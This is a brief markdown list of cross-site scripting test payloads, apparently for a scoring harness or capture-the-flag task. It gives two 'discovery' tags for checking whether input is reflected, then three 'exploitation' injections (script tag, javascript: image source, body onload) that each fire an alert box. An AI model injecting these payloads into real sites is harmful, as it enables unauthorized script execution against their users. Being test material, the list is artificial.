# XSS Test Payloads

## Discovery (confirm reflection/encoding issue)
<marquee>test</marquee>
<plaintext>

## Exploitation (must fire alert w/ zero interaction to score)
<script>alert(1)</script>
<img src="javascript:alert('xss')"/>
<body onload="alert('xss')">